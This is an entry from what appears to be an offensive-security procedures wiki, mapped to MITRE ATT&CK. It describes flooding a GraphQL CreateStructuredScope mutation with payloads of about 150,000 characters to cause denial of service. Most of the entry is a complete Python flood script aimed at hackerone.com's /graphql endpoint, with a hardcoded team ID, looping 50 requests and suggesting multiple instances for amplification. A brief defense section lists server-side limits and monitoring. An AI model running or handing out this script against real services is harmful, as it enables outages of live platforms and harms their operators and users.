---
id: proc-flood-oversized-payloads
tags:
  - dos
  - flood
  - oversized-payload
type: procedure
tools:
  - '[[tools/Python-Requests]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/send-oversized-graphql-payloads]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:56.719Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Flood Server with Oversized Payloads

## Summary

This procedure automates sending multiple GraphQL requests with extremely large instruction payloads (150k+ characters) to exhaust server resources, causing DoS in applications lacking server-side validation.

## Description

Exploiting flaws where client-side limits (e.g., 10k chars) are not mirrored server-side, this targets the instruction field in CreateStructuredScope. Using Python to loop requests (50+ times, amplified across instances), it uses Arabic characters for bloat without easy compression. Target: GraphQL on Ruby on Rails; outcomes include 500 errors from processing overload, leading to 502/504. Requires auth token; run ethically in controlled environments.

## Requirements

1. Python 3 with requests library installed
2. Valid X-Auth-Token and session cookies from target app
3. Team ID (base64-encoded, e.g., Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg=)
4. Access to /graphql endpoint

## Defense

Defensive measures and detection strategies:

- Enforce strict server-side length limits (e.g., MAX_INSTRUCTION_LENGTH=5000 consistently)
- Implement request size caps at nginx/Apache level
- Monitor for high CPU/memory from GraphQL parsing and alert on repeated large payloads

## Objectives

1. Overload server parsing/processing of oversized strings
2. Amplify impact via looped requests from multiple sources
3. Transition service to error states (500 -> 502/504)

## Instructions

### Step 1: Prepare Authentication and Payload

**Context**: Set up credentials and build the large string.

**Instructions**: Obtain cookies and token via browser dev tools after login. Define the payload builder: repeat Arabic string ('بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ ') 15,000 times, then concatenate 10x for ~150k chars.

> Use in script variables; input domain prefix (g) for asset_identifier variation.

### Step 2: Execute Flood Script

**Context**: Send looped requests to trigger exhaustion.

**Command** ([[commands/send-oversized-graphql-payloads]]):
```python
import requests
g = input('Enter : ')
burp0_url = 'https://hackerone.com:443/graphql'
burp0_cookies = {}  # Set your cookies
burp0_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'https://hackerone.com/testingfordos/scopes/new', 'content-type': 'application/json', 'X-Auth-Token': 'your_token_here', 'Origin': 'https://hackerone.com', 'Connection': 'close'}
a = ''
for i in range(15000):
    a += 'بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ '
instruction = a * 10
for i in range(50):
    burp0_json = {
        'operationName': 'CreateStructuredScope',
        'query': 'mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\n    was_successful\n    team {\n      id\n      structured_scopes(first: 500) {\n        edges {\n          node {\n            id\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n',
        'variables': {
            'asset_identifier': str(i) + str(g) + '.com',
            'asset_type': 'URL',
            'availability_requirement': 'high',
            'confidentiality_requirement': 'high',
            'eligible_for_bounty': True,
            'eligible_for_submission': True,
            'instruction': instruction,
            'integrity_requirement': 'high',
            'label_ids': [],
            'notify_subscribers_of_changes': True,
            'reference': 'sadasdasdas',
            'team_id': 'Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg='
        }
    }
    x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    print(str(x.status_code) + ' Status - Delay : ' + str(x.elapsed.total_seconds()) + ' seconds')
    print(x._content)
```

> Explanation: Script prompts for input (g), builds payload, loops 50 times varying asset_identifier, sends POST, prints status, delay, and content. Run multiple instances for amplification; initial 201, then 500 with delays.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Network Denial of Service]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/send-oversized-graphql-payloads]]

## Tools Used

- [[tools/Python-Requests]]

## Tags

- [[dos]]
- [[flood]]
- [[oversized-payload]]
